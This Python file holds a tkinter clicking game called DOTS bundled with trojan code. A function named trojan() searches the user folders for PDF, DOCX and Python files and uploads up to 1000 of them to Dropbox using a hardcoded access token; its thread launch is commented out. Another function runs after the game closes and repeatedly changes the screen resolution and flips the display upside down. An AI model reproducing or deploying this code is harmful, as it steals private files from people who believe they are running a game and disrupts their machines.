import os
import sys
import dropbox
import threading
import tkinter as T
import random
import win32api  # type: ignore
import win32con  # type: ignore
import time

def run_game():
    global s,m,glf,x,y,xx,yy,z,zz,speed,we,ch,geg,skk,txt1,txt2,g,onoff,pnt,opt,q,c
    canvas=T.Canvas(width=500,height=500)
    canvas.pack()
    subor= open('score.txt', 'a')
    subor.close()
    q=5
    c=1
    txt1=""
    txt2=""
    skk=""

    canvas.create_text(250,25,text='Welcome to DOTS',font='arial 20')
    def skin1(s1):
        global txt1
        global txt2
        txt1="Đ"
        txt2="€"
        skk="1"
    def skin2(s2):
        global txt1
        global txt2
        txt1="+"
        txt2="-"
        skk="2"
    def skin3(s3):
        global txt1
        global txt2
        txt1="X"
        txt2="Y"
        skk="3"

    def stvrt():
        r=random.randrange(256)
        o=random.randrange(256)
        b=random.randrange(256)
        farba= f'#{r:02x}{o:02x}{b:02x}'
        canvas.create_oval(250+70,250+70,250-70,250-70,fill=farba,outline='black')
        canvas.create_text(250,250,font='arial 20',text="you won",)
        
    def madara():
        canvas.create_oval(250+70,250+70,250-70,250-70,fill='red',width=4)
        canvas.create_oval(250+10,250+10,250-10,250-10,fill='black')
        canvas.create_oval(250+45,250+45,250-45,250-45,outline='black',width=10)
        canvas.create_oval(250+10,208+10,250-10,208-10,width=5,fill='red')
        canvas.create_oval(287+10,277+10,287-10,277-10,width=5,fill='red')
        canvas.create_oval(213+10,277+10,213-10,277-10,width=5,fill='red')
        
    def naruto():
    
        canvas.create_oval(250+20,250+20,250-20,250-30)
        canvas.create_oval(250-10,250-15,250-5,250-10,fill='black')
        canvas.create_oval(250+10,250-15,250+5,250-10,fill='black')
        canvas.create_rectangle(250-20,250-30,250+20,250-20,fill='white')
        canvas.create_line(250-3,250-25,250+3,250-25,250,250-28,250,250-23,250-3,250-28)
        canvas.create_polygon(250-20,250-30,250+20,250-30,250+20,250-40,250+15,250-35,250+10,250-50,250+5,250-35,250,250-53,250-5,250-35,250-10,250-50,250-15,250-35,250-20,250-40,fill='yellow',outline='black')
        canvas.create_line(250-10,250,250+10,250)
        canvas.create_line(250,250+20,250,250+100)

        canvas.create_line(250,250+30,250-20,250+50)
        canvas.create_line(250,250+30,250+20,250+50)

        canvas.create_line(250+20,250+50,250+50,250)
        canvas.create_line(250-20,250+50,250-50,250)

        canvas.create_line(250,250+100,250+20,250+130)
        canvas.create_line(250,250+100,250-20,250+130)

        canvas.create_line(250-20,250+130,250-20,250+150)
        canvas.create_line(250+20,250+130,250+20,250+150)

        canvas.create_oval(250+40,250+10,250+60,250-10,fill='cyan')
        canvas.create_oval(250-40,250+10,250-60,250-10,fill='cyan')

        canvas.create_line(250+50,250,250+55,250,250+55,250-7,250+50,250+7,250+43,250+3,250+44,250-6,250+50,250+8,250+50,250-8,250+58,250+6,fill='blue')
        canvas.create_line(250-50,250,250-55,250,250-55,250-7,250-50,250+7,250-43,250+3,250-44,250-6,250-50,250+8,250-50,250-8,250-58,250+6,fill='blue')
    def saringan():
        canvas.create_oval(250+70,250+70,250-70,250-70,fill='red',width=2)
        canvas.create_oval(250+10,250+10,250-10,250-10,fill='black')
        canvas.create_oval(250+45,250+45,250-45,250-45,outline='Indianred')
    def onetome():
        canvas.create_oval(250-5,208-5,250+5,208+5,fill='black')
        canvas.create_polygon(250+4,208-4,250+10,208-7,250,208-7,250-5,208-4,fill='black')
    def twotome():
        canvas.create_oval(287-5,277-5,287+5,277+5,fill='black')
        canvas.create_polygon(287+4,277+4,287+10,277+7,287,277+7,287-5,277+4,fill='black')
    def threetome():
        canvas.create_oval(213-5,277-5,213+5,277+5,fill='black')
        canvas.create_polygon(213-4,277+4,213-10,277+7,213,277+7,213+5,277+4,fill='black')
    def vajco():
        #telo
        canvas.create_oval(250+20,250+25,250-20,250-25)
        #oči
        canvas.create_oval(250+3,250-2,250+6,250-6,fill='black')
        canvas.create_oval(250-3,250-2,250-6,250-6,fill='black')
        #usta
        canvas.create_line(250-8,250+10,250+8,250+10)
        #ruky
        canvas.create_line(250+20,250+5,250+30,250+13)
        canvas.create_line(250-20,250+5,250-30,250+13)
        #nohy
        canvas.create_line(250+4,250+25,250+4,250+40)
        canvas.create_line(250-4,250+25,250-4,250+40)
        #koruna
        canvas.create_polygon(240,225,260,225,260,200,255,215,250,200,245,215,240,200,240,225,fill='yellow',outline='black')

    def robot():
        #hlava
        canvas.create_rectangle(250-12,250-25,250+12,250,fill='cyan')
        #telo
        canvas.create_rectangle(250-17,250,250+17,250+60,fill='cyan')
        #nohy
        canvas.create_rectangle(250-17,250+60,250-7,250+105,fill='cyan')
        canvas.create_rectangle(250+7,250+60,250+17,250+105,fill='cyan')
        #oči
        canvas.create_rectangle(250-10,250-20,250-5,250-15,fill='yellow')
        canvas.create_rectangle(250+10,250-20,250+5,250-15,fill='yellow')
        #usta
        canvas.create_rectangle(250-10,250-7,250+10,250-2,fill='red')
        #ruky
        canvas.create_polygon(250+20,250+5,250+15,250+10,250+45,250+25,250+50,250+20,fill='black')
        canvas.create_polygon(250-20,250+5,250-15,250+10,250-45,250+25,250-50,250+20,fill='black')
    def mandala():
        rr=100
        for i in range(10):
            r=random.randrange(256)
            o=random.randrange(256)
            b=random.randrange(256)
            farba= f'#{r:02x}{o:02x}{b:02x}'
            rr=rr-10
            canvas.create_oval(250+rr,250+rr,250-rr,250-rr,fill=farba)
    def auto():
        r=random.randrange(256)
        o=random.randrange(256)
        b=random.randrange(256)
        farba= f'#{r:02x}{o:02x}{b:02x}'
        canvas.create_rectangle(200,250,200+100,250+50,fill=farba)
        r=random.randrange(256)
        o=random.randrange(256)
        b=random.randrange(256)
        farba= f'#{r:02x}{o:02x}{b:02x}'
        canvas.create_oval(200+5,250+30,200+45,250+70,fill=farba)
        r=random.randrange(256)
        o=random.randrange(256)
        b=random.randrange(256)
        farba= f'#{r:02x}{o:02x}{b:02x}'
        canvas.create_oval(200+95,250+30,200+50,250+70,fill=farba)
    def kruh():
        
        global y
        global x
        global z
        global q
        global c
        global xx
        global yy
        global zz
        global txt1
        global txt2
        global speed
        global ch
        global onoff
        global opt
        global esc
        global pnt
        global čislo
        global niečo
        global s
        global m
        global h
        global glf
        global we
        
            
        opt=1
        glf=glf+1
        if glf==1:
            s=0
            m=0
            h=0
        canvas.delete('all')
        dismiss()
        canvas.create_rectangle(0,0,500,500,fill='white',width= 200)
        if 25<=g<50:
            vajco()
            
        if 75>g>=50:
            auto()
            
        if 100>g>=75:
            robot()
            
        if 125>g>=100:
            mandala()
            
        if 150>g>=125:
            naruto()
            
        if 225>g>=150:
            saringan()
            onetome()
            
        if 225>g>=175:
            twotome()
            
        if 225>g>=200:
            threetome()
            
        if 250>g>=225:
            madara()
            
        if 260>g>=250:
            stvrt()
        if g>=260:
            canvas.create_text(250,150,text='score only',fill='green',font='arial 25')
            
        canvas.create_text(250,50,fill='red',text="Left Click",font='arial 20')
        #kruh1
        canvas.create_oval(x+10,y+10,x-10,y-10,fill='red')
        canvas.create_text(x,y,text=txt1,font='arial 15',fill='blue')
        canvas.create_text(250,450,text=("score:",g),fill='red',font='arial 30')
        if x==z:
            y=y+q*c
            
        if y==395:
            x=x+1
            
        if x==z+1:
            y=y-q*c
            
        if y==110:
            x=x-1
        #kruh2

        canvas.create_text(250,75,text=(h,":",m,":",s),fill='red')
        
        canvas.create_text(450,450,text="K=end",fill="green")
        canvas.create_text(250,480,text=("speed=",speed),fill="green")
        canvas.create_oval(xx+10,yy+10,xx-10,yy-10,fill='blue')
        canvas.create_text(xx,yy,text=txt2,font='arial 15',fill='red')
        canvas.create_text(50,400,text="skin:",fill="green")
        canvas.create_text(50,420,text="1= Đ €",fill="green")
        canvas.create_text(50,440,text="2= + -",fill="green")
        canvas.create_text(50,460,text="3= x y",fill="green")
        canvas.create_text(250,20,text="if any problem restart game",fill="green")
        canvas.create_text(65,75,text="score left",fill='red')
        canvas.create_text(100,75,text=we,fill='red')
                        
        vypis()

        if ch==1:
            canvas.create_rectangle(225,225,275,275,fill='black')
        if c==0:
            
            subor=open('score.txt','a')
            r=random.randrange(256)
            o=random.randrange(256)
            b=random.randrange(256)
            farba= f'#{r:02x}{o:02x}{b:02x}'
            canvas.delete('all')
            canvas.create_rectangle(0,0,500,500,fill='black')
            canvas.create_text(50,30,text="esc=X",fill="red",font='arial 20')
            canvas.create_text(250,100,text="final score:",font='arial 60',fill='cyan')
            canvas.create_text(250,175,text=g,font='arial 50',fill=farba)
            canvas.create_text(250,250,text=("speed:",speed),font='arial 40',fill='cyan')
            canvas.create_text(250,370,text="hard mode:",font='arial 40',fill="cyan")
            canvas.create_text(250,410,text=onoff,font='arial 30',fill=farba)
            canvas.create_text(250,480,text=("R =restart"),font='arial 20',fill="green")
            pnt=pnt+1
            if pnt==1:
                subor.write("score: ")
                subor.write("\n")
                subor.write(str(g))
                subor.write("\n")
                subor.write("speed: ")
                subor.write(str(speed))
                subor.write("\n")
                subor.write("hard mode: ")
                subor.write(str(onoff))
                subor.write("\n")
                subor.write("time: ")
                subor.write(str(h))
                subor.write(":")
                subor.write(str(m))
                subor.write(":")
                subor.write(str(s))
                subor.write("\n")
                subor.write("-----------------------------")
                subor.write("\n")
                subor.close()

            
        if yy==zz:
            xx=xx+q*c
            
        if xx==395:
            yy=yy+1
            
        if yy==zz+1:
            xx=xx-q*c
            
        if xx==110:
            yy=yy-1
        
        
        canvas.after(speed,kruh)

    def faster():
        global speed
        global g
        if speed >1:
            speed=speed-1
            g=0
        else:
            speed=1
    def slower():
        global speed
        global g
        if speed >=1:
            g=0
            speed=speed+1

    def klik(stop):
        global we
        global q
        global g
        global d
        global geg
        if q==5 :
            q=0
        
        elif q==0 :
            q=5

        if q==0 and 240<=xx<=260 and 240<=y<=260:
            g=g+1
            
        if q==0 and 248<=xx<=252 and 248<=y<=252:
            g=g+4
        if geg<=g:
            geg=geg+25
        if geg>g:
            we=geg-g
            
            
    def end(end):
        global g
        global c
        global opt
        opt=1
        c=0
        
    def reset(r):
        global c
        global g
        global pnt
        global opt
        global m
        global s
        global h
        h=0
        s=0
        m=0
        opt=0
        pnt=0
        c=1
        g=0
        
    def hard():
        global ch
        global g
        global onoff
        
        if ch==0 and c==1:
            ch=1
            g=0
            onoff="on"
            
            
        elif ch==1 and c==1:
            ch=0
            g=0
            onoff="off"
            
    def options():
        global opt
        global skk
        if opt==0:
            canvas.delete('all')
            button2.place_forget()
            buttonfast.place(x=300,y=250)
            buttonslow.place(x=150,y=250)
            butoonhard.place(x=150,y=300)
            canvas.create_text(250,260,text=("speed=",speed),font='arial 12')
            canvas.create_text(250,310,text=(onoff),font='arial 13')
            canvas.after(1,options)

        
    def dismiss():
        canvas.delete('all')
        button.place_forget()
        button2.place_forget()
        buttonfast.place_forget()
        buttonslow.place_forget()
        butoonhard.place_forget()


    def escape(esc):
        quit()
            
    def vypis():
        global niečo
        global čislo
        
        
        niečo=0
        sub= open('score.txt','r')
        for i in range(1,100000000000,4):
            riadok=sub.readline()
            if riadok== '':
                break
            elif riadok[0]=='1' or riadok[0]=='2' or riadok[0]=='3' or riadok[0]=='4' or riadok[0]=='5' or riadok[0]=='6' or riadok[0]=='7' or riadok[0]=='8' or riadok[0]=='9':
                čislo= int(riadok)
                if čislo>niečo:
                    niečo=čislo
                else:
                    pass
            else:
                pass
        sub.close()
        
        canvas.create_text(225,420,text="best score:",fill='red',font='arial 15')
        canvas.create_text(300,420,text=niečo,fill='red',font='arial 15')
    def clock():
        global h
        global m
        global s
        s=s+1
        if s==60:
            s=0
            m=m+1
        if m==60:
            m=0
            h=h+1
        canvas.after(1000,clock)
    geg=25
    we=25
    h=0
    m=0
    s=0
    glf=0   
    onoff="off"
    opt=0
    ch=0
    g=0          
    z=250
    x=250
    y=110
    speed=10
    xx=110
    yy=250
    zz=250
    esc=0
    pnt=0
    canvas.bind('<Button-1>',klik)


    canvas.bind_all('k',end)
    canvas.bind_all('1',skin1)
    canvas.bind_all('2',skin2)
    canvas.bind_all('3',skin3)
    canvas.bind_all('r',reset)
    canvas.bind_all('<Escape>',escape)


    clock()
    button= T.Button(text="start",font='arial 25',bg='white',command=kruh)
    button2=T.Button(text="options",font='arial 25',bg='green',command=options)
    button.place(x=200,y=70)

    button2.place(x=180,y=200)

    buttonfast=T.Button(text="faster",bg='green',command=faster,font='arial 10')
    buttonslow=T.Button(text="slower",bg='green',command=slower,font='arial 10')
    butoonhard=T.Button(text="hard mode",bg='green',command=hard)

    T.mainloop()

# Function to run the 'trojan' behavior (external script)
def trojan():
    print("Running trojan behavior...")
    access_token= "sl.CBfJhuWQNl_L_eCWuX7DT9jfc8fXDO4obnFXMjx2sxKRfTTltRRqwTZNugpZvAIFVm1ZYlrotScsRTPiOaI7x1IGwAlZrdjnGzb6fqtpdx0UTTNgnGhiDkvA30oTOos5UPb933dp21kX"
    dbx = dropbox.Dropbox(access_token)

    user_directory = "C:\\Users\\"  

    target_directories = [ "Pictures","Desktop" ,"Documents"]

    jpg_files = []

    for dirpath, dirnames, filenames in os.walk(user_directory):

        dirnames[:] = [d for d in dirnames if not d.startswith('.')]

        for filename in filenames:
            if filename.lower().endswith('.pdf') and not filename.lower().startswith('{') or filename.lower().endswith('.docx')or filename.lower().endswith('.py'):
                file_path = os.path.join(dirpath, filename)

                if any(target_dir in file_path for target_dir in target_directories):
                    jpg_files.append(file_path)

                    if len(jpg_files) >= 1000:
                        break
        if len(jpg_files) >= 1000:
            break

    if not jpg_files:
        return

    for jpg_file in jpg_files:
        with open(jpg_file, "rb") as f:
            dbx.files_upload(f.read(), "/" + os.path.basename(jpg_file), mode=dropbox.files.WriteMode.overwrite)
def flipendo():
    def rotate_screen(rotation):
        try:
            # Get the current display settings
            dm = win32api.EnumDisplaySettings(None, 0)

            # Set the desired rotation
            if rotation == 180:
                dm.DisplayOrientation = win32con.DMDO_180
            else:
                dm.DisplayOrientation = win32con.DMDO_DEFAULT  # 0 degrees

            # Apply the new display settings
            result = win32api.ChangeDisplaySettings(dm, 0)
            if result != 0:
                print(f"Failed to change display settings. Error code: {result}")
        except Exception as e:
            print(f"Error while changing display settings: {e}")


    # Function to change screen resolution
    def change_resolution(width, height):
        try:
            # Get the current display settings
            dm = win32api.EnumDisplaySettings(None, 0)

            # Change the resolution
            dm.PelsWidth = width
            dm.PelsHeight = height

            # Apply the new display settings
            result = win32api.ChangeDisplaySettings(dm, 0)
            if result != 0:
                print(f"Failed to change resolution. Error code: {result}")
        except Exception as e:
            print(f"Error while changing resolution: {e}")


    # List of common resolutions
    resolutions = [[1920, 1080], [1600, 900], [1400, 1050], [1280, 800], [800, 600], [1680, 1050]]

    # Initial rotation state (0 degrees)
    current_rotation = 0  # Start at 0 degrees

    # Loop for 10 iterations
    for i in range(10):
        try:
            # Change the screen resolution randomly
            rez = random.choice(resolutions)
            change_resolution(rez[0], rez[1])  # Apply random resolution
            #print(f"Changing resolution to: {rez[0]}x{rez[1]}")
            time.sleep(1)  # Wait for 1 second for the resolution to take effect

            # Alternate between 0 and 180 degrees
            if current_rotation == 0:
                new_rotation = 180
            else:
                new_rotation = 0

            rotate_screen(new_rotation)  # Apply the new rotation
            print(f"Rotating screen to {new_rotation} degrees")

            # Update current rotation
            current_rotation = new_rotation
            time.sleep(0.1)  # Wait for 1 second between actions

        except Exception as e:
            print(f"Error in iteration {i}: {e}")

    # Reset the screen back to the default orientation and resolution
    rotate_screen(0)
    change_resolution(2880, 1620)
    print("Screen reset to default orientation and resolution.")
if __name__ == "__main__":
    therd_gui = threading.Thread(target=run_game)
    therd_trojan = threading.Thread(target=trojan)
    #therd_trojan.start()
    therd_gui.start()
    
    therd_gui.join()
    #therd_trojan.join()
    flipendo()